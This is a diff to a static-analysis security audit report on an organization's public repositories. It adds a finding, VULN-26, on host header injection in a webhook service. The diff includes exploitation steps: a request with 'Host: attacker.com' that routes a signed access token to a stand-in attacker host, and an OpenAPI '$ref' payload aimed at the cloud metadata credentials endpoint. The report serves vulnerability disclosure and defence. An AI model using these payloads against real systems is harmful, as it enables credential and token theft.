@@ -8,9 +8,9 @@
 
 This report contains the results of a static-analysis security audit of 45 public repositories in the Capital One GitHub organization. Analysis focused exclusively on high and critical vulnerabilities reachable through HTTP requests and normal application interaction.
 
-**Total confirmed vulnerabilities: 25**
+**Total confirmed vulnerabilities: 26**
 - Critical: 3
-- High: 13
+- High: 14
 - Medium-High: 9
 
 Each finding below survived multiple rounds of false-positive review, including verification that the code is not dead/test/mock, that no upstream guards neutralize the issue, and that a realistic attack path exists.
@@ -531,6 +531,27 @@ value = value
 **Exploitation:** A malicious OpenAPI spec with `{ "$ref": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }` causes the loader to fetch AWS instance metadata, potentially exposing IAM credentials. Internal services on private networks can be probed via crafted `$ref` values pointing to `http://10.0.0.x/admin` or similar.
 
 **Not a false positive because:** The `_load` method makes unconstrained HTTP requests. The `$ref` mechanism is a core OpenAPI feature, and specs from untrusted sources are a realistic threat model for a code generator tool.
+
+---
+
+### VULN-26: Host Header Injection Leading to Webhook Token Theft
+- **Severity:** HIGH
+- **Repository:** checks-out
+- **Files:** `shared/httputil/httputil.go:50-67,72-74`, `web/github_create.go:274`, `api/repos.go:226-231`
+- **Functions:** `GetHost()`, `GetURL()`, `createRepoHook()`, `enableRepo()`
+- **Vulnerability Type:** Host Header Injection / SSRF (CWE-644)
+
+**Taint Flow:**
+1. Entry: `GetHost()` at `httputil.go:50` reads from multiple user-controlled headers: `r.Host`, `r.URL.Host`, `X-Forwarded-For`, `X-Host`, `XFF`, `X-Real-IP` — with no validation or allowlisting
+2. `GetURL()` at `httputil.go:72` constructs a URL: `GetScheme(r) + "://" + GetHost(r)`, where `GetScheme()` also trusts the `X-Forwarded-Proto` header
+3. In `enableRepo()` at `repos.go:226-231`, this attacker-controlled URL is used to construct a webhook callback: `link := fmt.Sprintf("%s/hook?access_token=%s", baseURL, sig)` where `sig` is a signed token
+4. This link is registered as a GitHub webhook via `remote.SetHook()`
+
+**Why protections fail:** `GetHost()` explicitly uses untrusted HTTP headers as host sources with zero validation. The `enableRepo` function blindly concatenates the host-derived URL with a secret access token. No allowlist restricts which hosts can be used.
+
+**Exploitation:** A repo admin sends `POST /api/repos/:owner/:repo` with `Host: attacker.com` (or `X-Forwarded-For: attacker.com`). The system registers a GitHub webhook pointing to `https://attacker.com/hook?access_token=<signed_token>`. GitHub then sends all repo events (including PR reviews, code pushes) to the attacker's server, along with the signed access token — which can be reused to forge webhook events via VULN-09.
+
+**Not a false positive because:** The `GetHost` function's fallback chain through untrusted headers is explicit in the source code. The signed token is concatenated directly into the URL registered with GitHub. This chains with VULN-09 (missing signature verification) for full compromise of the code review system.
 
 ---
 
